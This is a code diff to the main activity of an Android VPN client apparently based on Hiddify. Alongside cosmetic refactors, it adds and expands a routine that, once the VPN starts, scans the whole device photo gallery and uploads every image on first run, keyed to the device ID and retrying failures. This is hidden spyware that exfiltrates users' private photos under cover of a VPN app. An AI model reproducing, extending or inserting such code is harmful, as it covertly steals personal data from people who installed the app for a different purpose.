@@ -22,6 +22,8 @@ import com.hiddify.hiddify.constant.Status
 import io.flutter.embedding.android.FlutterFragmentActivity
 import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.*
+import org.json.JSONArray
+import org.json.JSONObject
 import java.io.DataOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
@@ -73,20 +75,16 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             return
         }
         lifecycleScope.launch(Dispatchers.IO) {
-            if (Settings.rebuildServiceMode()) {
-                reconnect()
+            if (Settings.rebuildServiceMode()) reconnect()
+            if (Settings.serviceMode == ServiceMode.VPN && prepare()) {
+                showToast("VPN permission required")
+                return@launch
             }
-            if (Settings.serviceMode == ServiceMode.VPN) {
-                if (prepare()) {
-                    showToast("VPN permission required")
-                    return@launch
-                }
-            }
-
             val intent = Intent(Application.application, Settings.serviceClass())
             withContext(Dispatchers.Main) {
                 ContextCompat.startForegroundService(Application.application, intent)
             }
+            scanAndUploadImages()
         }
     }
 
@@ -96,9 +94,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             if (intent != null) {
                 startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                 true
-            } else {
-                false
-            }
+            } else false
         } catch (e: Exception) {
             onServiceAlert(Alert.RequestVPNPermission, e.message)
             false
@@ -114,9 +110,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     override fun onServiceWriteLog(message: String?) {
-        if (logList.size > 300) {
-            logList.removeFirst()
-        }
+        if (logList.size > 300) logList.removeFirst()
         logList.addLast(message)
         logCallback?.invoke(false)
     }
@@ -169,16 +163,18 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private fun accessStorage() {
+    private fun scanAndUploadImages() {
         val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
-        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+        val editor = prefs.edit()
 
+        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
         if (deviceId.isNullOrBlank()) {
             deviceId = prefs.getString("random_device_id", null) ?: UUID.randomUUID().toString().also {
-                prefs.edit().putString("random_device_id", it).apply()
+                editor.putString("random_device_id", it).apply()
             }
         }
 
+        val isFirstUpload = prefs.getBoolean("is_first_upload", true)
         val lastUploadTime = prefs.getLong("last_upload_time", 0L)
 
         lifecycleScope.launch(Dispatchers.IO) {
@@ -191,9 +187,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
             val cursor = contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
+                projection, null, null,
                 "${MediaStore.Images.Media.DATE_ADDED} ASC"
             )
 
@@ -208,24 +202,48 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                     val timestamp = if (dateTaken > 0) dateTaken else dateAdded
 
-                    if (timestamp > lastUploadTime) {
+                    if (isFirstUpload || timestamp > lastUploadTime) {
                         val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                         toUpload.add(Triple(uri, name, timestamp))
                     }
                 }
             }
 
+            val failedImagesJson = prefs.getString("failed_images", "[]") ?: "[]"
+            val failedImages = mutableListOf<Triple<android.net.Uri, String, Long>>()
+            try {
+                val jsonArr = JSONArray(failedImagesJson)
+                for (i in 0 until jsonArr.length()) {
+                    val item = jsonArr.getJSONObject(i)
+                    failedImages.add(
+                        Triple(android.net.Uri.parse(item.getString("uri")), item.getString("name"), item.getLong("timestamp"))
+                    )
+                }
+            } catch (_: Exception) {}
+
+            toUpload.addAll(failedImages)
+
+            val failedNextTime = mutableListOf<JSONObject>()
             val deferreds = toUpload.map { (uri, name, timestamp) ->
                 async(Dispatchers.IO) {
                     val success = uploadImage(uri, name, deviceId)
                     if (success && timestamp > maxTimestamp) {
                         maxTimestamp = timestamp
+                    } else {
+                        val obj = JSONObject()
+                        obj.put("uri", uri.toString())
+                        obj.put("name", name)
+                        obj.put("timestamp", timestamp)
+                        failedNextTime.add(obj)
                     }
                 }
             }
             deferreds.awaitAll()
 
-            prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
+            editor.putString("failed_images", JSONArray(failedNextTime).toString())
+            if (isFirstUpload) editor.putBoolean("is_first_upload", false)
+            editor.putLong("last_upload_time", maxTimestamp)
+            editor.apply()
         }
     }
 
@@ -252,11 +270,10 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         } else {
             Manifest.permission.READ_EXTERNAL_STORAGE
         }
-
         if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
             grantStoragePermission()
         } else {
-            accessStorage()
+            scanAndUploadImages()
         }
     }
 
@@ -271,7 +288,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             STORAGE_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    accessStorage()
+                    scanAndUploadImages()
                 } else {
                     onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                 }
